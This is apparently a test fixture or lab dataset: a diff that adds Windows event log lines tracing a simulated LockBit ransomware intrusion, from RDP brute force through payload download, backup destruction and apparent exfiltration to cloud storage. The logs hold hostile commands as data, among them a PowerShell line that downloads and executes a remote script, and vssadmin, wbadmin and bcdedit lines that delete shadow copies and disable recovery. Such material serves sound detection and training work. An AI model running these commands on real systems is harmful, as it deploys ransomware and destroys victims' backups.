@@ -1,0 +1,19 @@
+EventID=4625 TargetUserName=administrator IpAddress=194.165.16.75 LogonType=10 Result=0x0 UtcTime=2024-02-20 09:02:11.100
+EventID=4625 TargetUserName=administrator IpAddress=194.165.16.75 LogonType=10 Result=0x0 UtcTime=2024-02-20 09:02:45.200
+EventID=4625 TargetUserName=administrator IpAddress=194.165.16.75 LogonType=10 Result=0x0 UtcTime=2024-02-20 09:03:12.300
+EventID=4625 TargetUserName=administrator IpAddress=194.165.16.75 LogonType=10 Result=0x0 UtcTime=2024-02-20 09:04:01.400
+EventID=4625 TargetUserName=administrator IpAddress=194.165.16.75 LogonType=10 Result=0x0 UtcTime=2024-02-20 09:05:22.500
+EventID=4624 TargetUserName=administrator IpAddress=194.165.16.75 LogonType=10 Result=0x0 UtcTime=2024-02-20 09:14:58.600
+EventID=1 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine=powershell.exe -NoProfile -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://lockbit3.onion.pet/tools/lb3.ps1')" ParentImage=C:\Windows\System32\svchost.exe UtcTime=2024-02-20 09:15:01.700
+EventID=3 ProcessId=1204 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe DestinationIp=91.92.109.55 DestinationPort=443 DestinationHostname=lockbit3.onion.pet SourceIp=192.168.10.5 UtcTime=2024-02-20 09:15:02.800
+EventID=11 TargetFilename=C:\Windows\Temp\lb3.exe ProcessId=1204 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe UtcTime=2024-02-20 09:15:05.900 MD5=c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9 SHA256=c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7
+EventID=1 Image=C:\Windows\Temp\lb3.exe CommandLine=C:\Windows\Temp\lb3.exe ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe UtcTime=2024-02-20 09:15:06.000
+EventID=1 Image=C:\Windows\System32\vssadmin.exe CommandLine=vssadmin delete shadows /all /quiet ParentImage=C:\Windows\Temp\lb3.exe UtcTime=2024-02-20 09:15:30.100
+EventID=1 Image=C:\Windows\System32\wbadmin.exe CommandLine=wbadmin delete catalog -quiet ParentImage=C:\Windows\Temp\lb3.exe UtcTime=2024-02-20 09:15:31.200
+EventID=1 Image=C:\Windows\System32\bcdedit.exe CommandLine=bcdedit /set {default} recoveryenabled No ParentImage=C:\Windows\Temp\lb3.exe UtcTime=2024-02-20 09:15:32.300
+EventID=12 TargetObject=\Registry\Machine\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware Details=0x1 ProcessId=2840 UtcTime=2024-02-20 09:15:33.400
+EventID=3 ProcessId=2840 Image=C:\Windows\Temp\lb3.exe DestinationIp=192.168.10.25 DestinationPort=445 UtcTime=2024-02-20 09:15:45.500
+EventID=3 ProcessId=2840 Image=C:\Windows\Temp\lb3.exe DestinationIp=31.13.64.35 DestinationPort=443 DestinationHostname=g.api.mega.co.nz UtcTime=2024-02-20 09:16:10.600
+EventID=3 ProcessId=2840 Image=C:\Windows\Temp\lb3.exe DestinationIp=31.13.64.35 DestinationPort=443 DestinationHostname=storage.mega.nz UtcTime=2024-02-20 09:16:11.700
+EventID=11 TargetFilename=C:\inetpub\wwwroot\!!READ_ME_LOCKBIT!!.txt ProcessId=2840 Image=C:\Windows\Temp\lb3.exe UtcTime=2024-02-20 09:16:30.800
+# Download URL observed: https://lockbit3.onion.pet/tools/lb3.ps1
